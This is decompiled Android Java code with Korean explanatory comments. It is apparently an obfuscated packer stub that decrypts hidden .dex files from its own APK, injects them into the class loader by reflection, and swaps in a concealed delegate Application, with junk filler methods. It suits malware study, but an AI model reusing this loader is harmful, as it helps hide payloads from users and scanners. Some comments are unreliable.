// Android 애플리케이션에서 동적 코드를 로드하고 초기화하기 위해 리플렉션과 ZIP 파일 작업을 활용
// attachBaseContext, onCreate, createPackageContext와 같은 메서드들은 애플리케이션의 실행 시점에 특정 동작을 수행하도록 설계
//  이 코드의 주요 기능은 ZIP 파일을 열고 덱스 파일을 처리하여 로드하는 것입
//  리플렉션을 통해 런타임 시 애플리케이션의 다양한 부분을 동적으로 설정

package com.lzsEsq.dykSgp.jhvqZx;

import android.app.Application;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.LinkedList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

/* loaded from: classes.dex */
public class pupsPVlBod extends Application {
    public String a;  // 애플리케이션의 이름
    public String b;  // 애플리케이션의 버전
    public ZipFile c; // ZIP 파일을 처리하기 위한 변수
    public boolean d; // 내부 상태를 나타내는 플래그
    public Field e;   // 리플렉션을 위한 클래스 필드 참조를 보관
    public Object f;  // 리플렉션을 위한 객체 인스턴스 참조를 보관
    public Field g;   // 리플렉션을 위한 클래스 필드 참조를 보관
    public Object[] h; // 덱스(dex) 요소를 보관하는 배열
    public Method i;  // 리플렉션을 위한 메서드 참조를 보관
    public ArrayList<IOException> j = new ArrayList<>(); // IO 예외를 저장하는 리스트
    private boolean k = false; // 초기화를 위한 내부 플래그
    private Handler l; // 메시지와 실행 가능한 객체를 관리하는 핸들러
    public boolean m;  // 또 다른 내부 상태 플래그
    public Application n; // Application 인스턴스에 대한 참조를 보관

    /* loaded from: classes.dex */
    public interface f {
        // 파일 및 ZIP 파일에 대한 작업을 수행하는 인터페이스
        void a(File file);

        void a(ZipFile zipFile);
    }

    public pupsPVlBod() {
        // 생성자: 초기화 및 핸들러 생성
        new ArrayList();
        this.l = new a();
    }

    private void d() {
        // 내부 상태를 설정하고 일부 객체를 초기화하는 메서드
        if (this.k) {
            this.k = true;
            a(1, 7);
            e l1 = new e(1);
            e l2 = new e(2);
            e l3 = new e(3);
            e l4 = new e(4);
            e l5 = new e(5);
            l1.b = l2;
            l2.b = l3;
            l3.b = l4;
            l4.b = l5;
        }
    }

    private ArrayList<String> e() {
        // 특정 조건에서 리스트를 생성하는 메서드
        if (this.k) {
            ArrayList<String> list = new ArrayList<>();
            ArrayList<String> dir = new ArrayList<>();
            e a1 = new e(2);
            e a2 = new e(4);
            e a3 = new e(3);
            a1.b = a2;
            a2.b = a3;
            e b1 = new e(5);
            e b2 = new e(6);
            e b3 = new e(4);
            b1.b = b2;
            b2.b = b3;
            int[] iArr = {3, 2, 2, 3};
            if (dir.size() != 0) {
                a(new int[]{1, 1, 2});
                return list;
            }
            return dir;
        }
        return null;
    }

    public static int a(int[] nums) {
        // 주어진 정수 배열에서 중복을 제거하고 고유한 요소의 수를 반환하는 메서드
        if (nums.length == 0) {
            return 0;
        }
        int j = 0;
        for (int i = 0; i < nums.length; i++) {
            if (nums[i] != nums[j]) {
                j++;
                nums[j] = nums[i];
            }
        }
        return j + 1;
    }

    public String a(int n, int k) {
        // 주어진 수열에서 k번째 순열을 생성하는 메서드
        List<Integer> num = new LinkedList<>();
        for (int i = 1; i <= n; i++) {
            num.add(Integer.valueOf(i));
        }
        int[] fact = new int[n];
        fact[0] = 1;
        for (int i2 = 1; i2 < n; i2++) {
            fact[i2] = fact[i2 - 1] * i2;
        }
        int k2 = k - 1;
        StringBuilder sb = new StringBuilder();
        for (int i3 = n - 1; i3 >= 0; i3--) {
            int ind = k2 / fact[i3];
            k2 %= fact[i3];
            sb.append(num.get(ind));
            num.remove(ind);
        }
        return sb.toString();
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* loaded from: classes.dex */
    private static class e {
        // 정수 값을 보관하고 다음 요소를 가리키는 클래스
        int a;
        e b;

        e(int x) {
            this.a = x;
        }

        public String toString() {
            StringBuilder append = new StringBuilder().append(this.a).append(" ");
            Object obj = this.b;
            if (obj == null) {
                obj = "";
            }
            return append.append(obj).toString();
        }
    }

    /* loaded from: classes.dex */
    class a extends Handler {
        // 메시지를 처리하는 핸들러 클래스
        a() {
        }

        @Override // android.os.Handler
        public void handleMessage(Message msg) {
            pupsPVlBod.this.n.onCreate();
        }
    }

    @Override // android.content.ContextWrapper
    protected void attachBaseContext(Context base) {
        // 애플리케이션의 기본 컨텍스트를 설정하는 메서드
        super.attachBaseContext(base);
        c(); // 애플리케이션 정보 설정
        File apkFile = new File(getApplicationInfo().sourceDir); // APK 파일 경로
        File versionDir = getDir(this.a + "_" + this.b, 0); // 버전 디렉토리 생성
        File appDir = new File(versionDir, "app"); // 앱 디렉토리 생성
        File dexDir = new File(appDir, "dexDir"); // 덱스 디렉토리 생성
        List<File> dexFiles = new ArrayList<>(); // 덱스 파일 리스트
        if (!dexDir.exists() || dexDir.list().length == 0) {
            a(apkFile, appDir, new b(dexFiles)); // 덱스 파일을 추출 및 추가
        } else {
            for (File file : dexDir.listFiles()) {
                dexFiles.add(file);
            }
        }
        b(); // 덱스 요소 초기화
        try {
            ZipFile zipFile = this.c;
            if (zipFile != null) {
                zipFile.close();
            }
            a(dexFiles, versionDir); // 덱스 파일 처리 및 저장
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    /* loaded from: classes.dex */
    class b implements f {
        // 파일 및 ZIP 파일 처리를 위한 클래스
        final /* synthetic */ List a;

        b(List list) {
            this.a = list;
        }

        void b(File file) {
            try {
                new c();
                byte[] bytes = c.a(file); // 파일의 바이트 배열 생성
                ymcBssEDD.decrypt(bytes, file.getAbsolutePath()); // 파일 복호화
                this.a.add(file); // 복호화된 파일 추가
            } catch (Exception e) {
            }
        }

        @Override // com.lzsEsq.dykSgp.jhvqZx.pupsPVlBod.f
        public void a(File file) {
            b(file);
        }

        @Override // com.lzsEsq.dykSgp.jhvqZx.pupsPVlBod.f
        public void a(ZipFile zipFile) {
            pupsPVlBod pupspvlbod = pupsPVlBod.this;
            pupspvlbod.d = false;
            pupspvlbod.c = zipFile;
        }
    }

    public void b() {
        // 리플렉션을 사용하여 덱스 요소 초기화
        try {
            c myTools1 = new c();
            c myTools2 = new c();
            new c();
            Field a2 = myTools1.a(getClassLoader(), "pathList"); // 경로 리스트 필드 가져오기
            this.e = a2;
            Object obj = a2.get(getClassLoader());
            this.f = obj;
            Field a3 = myTools2.a(obj, "dexElements"); // 덱스 요소 필드 가져오기
            this.g = a3;
            this.h = (Object[]) a3.get(this.f); // 덱스 요소 배열 저장
            this.i = c.a(this.f, "makePathElements", List.class, File.class, List.class); // 경로 요소 생성 메서드 가져오기
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public void a(List<File> dexFiles, File versionDir) {
        // 새로운 덱스 요소 추가
        Object[] addElements = (Object[]) this.i.invoke(this.f, dexFiles, versionDir, this.j);
        Object[] newElements = (Object[]) Array.newInstance(this.h.getClass().getComponentType(), this.h.length + addElements.length);
        Object[] objArr = this.h;
        System.arraycopy(objArr, 0, newElements, 0, objArr.length);
        System.arraycopy(addElements, 0, newElements, this.h.length, addElements.length);
        this.g.set(this.f, newElements);
    }

    @Override // android.app.Application
    public void onCreate() {
        // 애플리케이션 초기화 메서드
        super.onCreate();
        try {
            a(); // 초기화 및 설정 메서드
            d(); // 내부 상태 설정 메서드
            e(); // 특정 리스트 생성 메서드
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    @Override // android.content.ContextWrapper, android.content.Context
    public String getPackageName() {
        // 패키지 이름 반환 메서드
        return !TextUtils.isEmpty(this.a) ? "" : super.getPackageName();
    }

    @Override // android.content.ContextWrapper, android.content.Context
    public Context createPackageContext(String packageName, int flags) {
        // 패키지 컨텍스트 생성 메서드
        if (TextUtils.isEmpty(this.a)) {
            return super.createPackageContext(packageName, flags);
        }
        try {
            a(); // 초기화 및 설정 메서드
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return this.n;
    }

    private void a() {
        // 애플리케이션을 설정하고 내부 상태를 초기화하는 메서드
        if (!this.m && !TextUtils.isEmpty(this.a)) {
            Context baseContext = getBaseContext();
            Class<?> delegateClass = Class.forName(this.a);
            this.n = (Application) delegateClass.newInstance(); // 새로운 Application 인스턴스 생성
            Method attach = Application.class.getDeclaredMethod("attach", Context.class);
            attach.setAccessible(true);
            attach.invoke(this.n, baseContext); // 애플리케이션 컨텍스트 설정
            Class<?> contextImplClass = Class.forName("android.app.ContextImpl");
            Field mOuterContextField = contextImplClass.getDeclaredField("mOuterContext");
            mOuterContextField.setAccessible(true);
            mOuterContextField.set(baseContext, this.n); // 외부 컨텍스트 설정
            Field mMainThreadField = contextImplClass.getDeclaredField("mMainThread");
            mMainThreadField.setAccessible(true);
            Object mMainThread = mMainThreadField.get(baseContext);
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            Field mInitialApplicationField = activityThreadClass.getDeclaredField("mInitialApplication");
            mInitialApplicationField.setAccessible(true);
            mInitialApplicationField.set(mMainThread, this.n); // 초기 애플리케이션 설정
            Field mAllApplicationsField = activityThreadClass.getDeclaredField("mAllApplications");
            mAllApplicationsField.setAccessible(true);
            ArrayList<Application> mAllApplications = (ArrayList) mAllApplicationsField.get(mMainThread);
            mAllApplications.remove(this);
            mAllApplications.add(this.n); // 모든 애플리케이션 리스트 업데이트
            Field mPackageInfoField = contextImplClass.getDeclaredField("mPackageInfo");
            mPackageInfoField.setAccessible(true);
            Object mPackageInfo = mPackageInfoField.get(baseContext);
            Class<?> loadedApkClass = Class.forName("android.app.LoadedApk");
            Field mApplicationField = loadedApkClass.getDeclaredField("mApplication");
            mApplicationField.setAccessible(true);
            mApplicationField.set(mPackageInfo, this.n); // 패키지 정보 설정
            Field mApplicationInfoField = loadedApkClass.getDeclaredField("mApplicationInfo");
            mApplicationInfoField.setAccessible(true);
            ApplicationInfo mApplicationInfo = (ApplicationInfo) mApplicationInfoField.get(mPackageInfo);
            mApplicationInfo.className = this.a; // 애플리케이션 정보 클래스 이름 설정
            this.l.sendEmptyMessage(1); // 메시지 전송
            this.m = true; // 초기화 완료 상태로 설정
        }
    }

    /* loaded from: classes.dex */
    public static class c {
        // 파일을 읽고 리플렉션을 처리하는 클래스
        public static byte[] a(File file) {
            RandomAccessFile r = new RandomAccessFile(file, "r");
            String lenStr = "" + r.length();
            int result = Integer.parseInt(lenStr);
            byte[] buffer = new byte[result];
            r.readFully(buffer);
            r.close();
            return buffer; // 파일의 모든 바이트를 읽어서 반환
        }

        public Field a(Object instance, String name) {
            // 주어진 인스턴스와 필드 이름을 사용하여 필드를 가져오는 메서드
            for (Class clazz = instance.getClass(); clazz != null; clazz = clazz.getSuperclass()) {
                try {
                    Field field = clazz.getDeclaredField(name);
                    if (!field.isAccessible()) {
                        field.setAccessible(true);
                    }
                    return field;
                } catch (NoSuchFieldException e) {
                }
            }
            throw new NoSuchFieldException("no field");
        }

        public static Method a(Object instance, String name, Class... parameterTypes) {
            // 주어진 인스턴스와 메서드 이름 및 파라미터 타입을 사용하여 메서드를 가져오는 메서드
            for (Class clazz = instance.getClass(); clazz != null; clazz = clazz.getSuperclass()) {
                try {
                    Method method = clazz.getDeclaredMethod(name, parameterTypes);
                    if (!method.isAccessible()) {
                        method.setAccessible(true);
                    }
                    return method;
                } catch (NoSuchMethodException e) {
                }
            }
            throw new NoSuchMethodException("error method");
        }
    }

    private void c() {
        // 애플리케이션 정보를 설정하는 메서드
        try {
            ApplicationInfo applicationInfo = getPackageManager().getApplicationInfo(getPackageName(), 128);
            Bundle metaData = applicationInfo.metaData;
            if (metaData != null) {
                if (metaData.containsKey("app_name")) {
                    this.a = metaData.getString("app_name");
                }
                if (metaData.containsKey("app_version")) {
                    this.b = metaData.getString("app_version");
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static void a(File file) {
        // 파일이나 디렉토리를 삭제하는 메서드
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            for (File f2 : files) {
                a(f2);
            }
            return;
        }
        file.delete();
    }

    public static void a(File xZip, File mDir, f mLister) {
        // ZIP 파일을 해제하고 파일을 처리하는 메서드
        try {
            a(mDir); // 디렉토리 정리
            ZipFile zipFile = new ZipFile(xZip); // ZIP 파일 열기
            Enumeration<? extends ZipEntry> entries = zipFile.entries();
            while (entries.hasMoreElements()) {
                ZipEntry zipEntry = entries.nextElement();
                String name = zipEntry.getName();
                if (!name.equals("META-INF/CERT.RSA") && !name.equals("META-INF/CERT.SF") && !name.equals("META-INF/MANIFEST.MF") && !zipEntry.isDirectory()) {
                    File file = new File(mDir, name);
                    if (!file.getParentFile().exists()) {
                        file.getParentFile().mkdirs();
                    }
                    String fileName = file.getName();
                    if (fileName.endsWith(".dex") && !TextUtils.equals(fileName, "classes.dex")) {
                        a(zipFile, zipEntry, file, mLister); // DEX 파일 처리
                    } else {
                        FileOutputStream fos = new FileOutputStream(file);
                        d myTools = new d();
                        InputStream is = (InputStream) myTools.a(zipEntry, zipFile);
                        byte[] buffer = new byte[2048];
                        while (true) {
                            int len = is.read(buffer);
                            if (len == -1) {
                                break;
                            } else {
                                fos.write(buffer, 0, len);
                            }
                        }
                        is.close();
                        fos.close();
                    }
                }
            }
            mLister.a(zipFile);
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    /* loaded from: classes.dex */
    public static class d {
        // ZIP 파일의 입력 스트림을 처리하는 클래스
        public Object a(Object zipEntry, Object zipFile) {
            try {
                Class zipFileClass = zipFile.getClass();
                Method method = zipFileClass.getMethod("getInputStream", ZipEntry.class);
                return method.invoke(zipFile, zipEntry); // 입력 스트림을 반환
            } catch (Exception e) {
                return null;
            }
        }
    }

    public static void a(ZipFile zipFile, ZipEntry zipEntry, File file, f fileLister) {
        // ZIP 파일에서 특정 파일을 추출하여 저장하고, 해당 파일을 처리하는 메서드
        try {
            FileOutputStream fos = new FileOutputStream(file);
            InputStream is = zipFile.getInputStream(zipEntry);
            byte[] buffer = new byte[2048];
            while (true) {
                int len = is.read(buffer);
                if (len != -1) {
                    fos.write(buffer, 0, len);
                } else {
                    is.close();
                    fos.close();
                    fileLister.a(file); // 파일 처리 호출
                    return;
                }
            }
        } catch (Exception e2) {
        }
    }
}
